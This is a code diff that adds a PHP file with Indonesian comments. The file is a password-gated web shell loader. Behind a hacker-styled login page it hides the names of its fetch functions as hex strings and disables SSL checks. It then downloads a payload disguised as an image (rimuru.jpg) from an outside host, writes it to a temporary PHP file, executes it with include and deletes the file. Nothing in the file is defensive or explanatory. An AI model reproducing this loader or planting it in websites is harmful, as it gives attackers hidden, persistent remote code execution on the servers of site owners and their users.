@@ -1,0 +1,125 @@
+<?php
+// --- AKTIFKAN ERROR UNTUK DEBUG ---
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+// --- START SESSION ---
+session_start();
+
+// --- CONFIG PASSWORD ---
+$secure_password_hash = '$2a$12$AulKg6bFQPJrHZ0/YSCPse2uXJ8gzPR.bwfuZ.Xms3nmNbR3AdtYi';
+$session_key = hash('sha256', $_SERVER['HTTP_HOST'] . '_aptisme_v2');
+
+// --- TAMPILKAN FORM LOGIN ---
+function show_login_form($error = '') {
+    $errhtml = $error ? "<div style='color:#ff6666;margin-top:10px;'>".htmlspecialchars($error)."</div>" : "";
+    echo <<<HTML
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Aptisme Login</title>
+<style>
+body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;}
+.box{background:#111;padding:30px;border:2px solid #0f0;border-radius:10px;width:300px;}
+input{width:100%;padding:10px;margin-top:10px;background:#000;color:#0f0;border:1px solid #0f0;}
+input[type=submit]{background:#0f0;color:#000;font-weight:bold;cursor:pointer;}
+input[type=submit]:hover{background:#00b300;}
+</style>
+</head>
+<body>
+<div class="box">
+<form method="post">
+<label>Password:</label>
+<input type="password" name="password" required>
+<input type="submit" value="Login">
+</form>
+{$errhtml}
+</div>
+</body>
+</html>
+HTML;
+    exit;
+}
+
+// --- CEK LOGIN SESSION ---
+if (!isset($_SESSION[$session_key])) {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+        if (password_verify($_POST['password'], $secure_password_hash)) {
+            $_SESSION[$session_key] = true;
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit();
+        } else {
+            show_login_form('Password salah!');
+        }
+    } else {
+        show_login_form();
+    }
+}
+
+// --- CONVERT HEX KE STRING ---
+function hex2str($hex) {
+    $str = '';
+    for ($i = 0; $i < strlen($hex); $i += 2) {
+        $str .= chr(hexdec(substr($hex, $i, 2)));
+    }
+    return $str;
+}
+
+// --- AMBIL KONTEN DARI URL ---
+function geturlsinfo($destiny) {
+    $methods = array(
+        hex2str('666f70656e'),                             // fopen
+        hex2str('73747265616d5f6765745f636f6e74656e7473'), // stream_get_contents
+        hex2str('66696c655f6765745f636f6e74656e7473'),     // file_get_contents
+        hex2str('6375726c5f65786563')                      // curl_exec
+    );
+
+    // --- CURL
+    if (function_exists($methods[3])) {
+        $ch = curl_init($destiny);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible)");
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        $result = $methods[3]($ch);
+        curl_close($ch);
+        return $result;
+    }
+
+    // --- FILE_GET_CONTENTS
+    if (function_exists($methods[2])) {
+        return $methods[2]($destiny);
+    }
+
+    // --- FOPEN + STREAM_GET_CONTENTS
+    if (function_exists($methods[0]) && function_exists($methods[1])) {
+        $handle = $methods[0]($destiny, "r");
+        if ($handle) {
+            $result = $methods[1]($handle);
+            fclose($handle);
+            return $result;
+        }
+    }
+
+    return false;
+}
+
+// --- AMBIL & JALANKAN PAYLOAD ---
+$target_url = 'https://haxor-research.com/rimuru.jpg';
+$payload = geturlsinfo($target_url);
+
+if ($payload !== false && trim($payload) !== '') {
+    // Simpan ke file sementara
+    $tmpfile = __DIR__ . '/temp_payload.php';
+    file_put_contents($tmpfile, $payload);
+
+    // Jalankan dan bersihkan
+    include $tmpfile;
+    unlink($tmpfile);
+} else {
+    echo "<div style='color:red;font-family:monospace;padding:20px;'>Gagal mengambil payload dari URL:<br>$target_url<br><br>Pastikan URL valid dan server mengizinkan koneksi keluar.</div>";
+}
+?>
